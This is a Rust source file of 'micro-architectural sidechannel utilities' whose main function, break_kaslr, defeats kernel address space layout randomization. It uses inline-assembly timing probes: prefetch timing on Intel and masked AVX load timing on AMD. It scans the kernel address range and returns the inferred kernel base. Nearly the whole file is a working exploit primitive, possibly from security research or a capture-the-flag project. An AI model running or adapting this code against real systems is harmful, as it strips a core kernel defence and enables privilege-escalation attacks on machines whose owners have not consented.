//! micro-architectural sidechannel utilities
use raw_cpuid::CpuId;
use std::arch::asm;
use log::info;

fn time_masked_avx(addr: *const libc::c_void) -> u64 {
    let mut time: u64 = 0;
    unsafe {
        asm!(
            "push rbx;",
            "push rdx;",

            "sub rsp, 32;",
            "movdqa [rsp], xmm0;",
            "movdqa [rsp + 16], xmm2;",

            "movaps xmm2, xmm0;",
            "xorps xmm2, xmm2;",
            "lfence;",

                "rdtsc;",
                "shl rdx, 32;",
                "or rdx, rax;",
                "mov rbx, rdx;",

                "vmaskmovps xmm1, xmm2, [{addr}];",
                "lfence;",

                "rdtsc;",
                "shl rdx, 32;",
                "or rdx, rax;",

            "sub rdx, rbx;",
            "mov {time}, rdx;",

            "movdqa xmm0, [rsp];",
            "movdqa xmm2, [rsp + 16];",
            "add rsp, 32;",

            "pop rdx;",
            "pop rbx;",
            addr = in(reg) addr,
            time = inout(reg) time,
        );
    }
    time
}

fn time_prefetch(addr: *const libc::c_void) -> u64 {
    let mut time: u64 = 0;
    unsafe {
        asm!(
            "push rbx;",
            "push rdx;",
            "lfence;",

                "rdtsc;",
                "shl rdx, 32;",
                "or rdx, rax;",
                "mov rbx, rdx;",

                "prefetcht2 BYTE PTR [{addr}];",
                "lfence;",

                "rdtsc;",
                "shl rdx, 32;",
                "or rdx, rax;",
                "lfence;",

            "sub rdx, rbx;",
            "mov {time}, rdx;",

            "pop rdx;",
            "pop rbx;",
            addr = in(reg) addr,
            time = inout(reg) time,
        );
    }
    time
}

/// Uses a side channel to break KASLR, either prefetch on Intel or a fault
/// timing attack on AMD
///
/// Args:
/// * `offset` - The offset of the address found by probing to the KASLR base address
///
/// Return:
/// * The address found by the side channel minus the `offset`, which should be the KASLR base address
pub fn break_kaslr(offset: u64) -> u64 {
    let kernel_lower_bound: u64 = 0xffffffff80000000;
    let kernel_upper_bound: u64 = 0xffffffffc0000000;

    let step = 0x100000;

    let dummy_iterations = 5;
    let iterations = 100;

    let arr_size: usize = (kernel_upper_bound - kernel_lower_bound) as usize / step;
    let scan_start: u64 = kernel_lower_bound;

    let mut probe_fn: &dyn Fn(*const libc::c_void) -> u64 = &time_masked_avx;

    let cpuid = CpuId::new();
    if let Some(vendor) = cpuid.get_vendor_info() {
        if vendor.as_str() == "GenuineIntel" {
            probe_fn = &time_prefetch;
        }
    }

    let mut timings: Vec<u64> = vec![0; arr_size as usize];

    let mut min: u64 = u64::MAX;
    let mut addr: u64 = 0;

    for i in 0..(iterations + dummy_iterations) {
        for idx in 0..arr_size {
            let target = scan_start + (idx * step) as u64;
            unsafe {
                libc::getuid();
            }
            let time = probe_fn(target as *const libc::c_void);
            if i >= dummy_iterations {
                timings[idx] += time;
            }
        }
    }

    for i in 0..arr_size {
        timings[i] /= iterations;
        if timings[i] < min {
            min = timings[i];
            addr = scan_start as u64 + (i as u64) * step as u64;
        }
    }

    let base = addr - offset;
    info!("break_kaslr ~ .text = {base:#x}");
    base
}
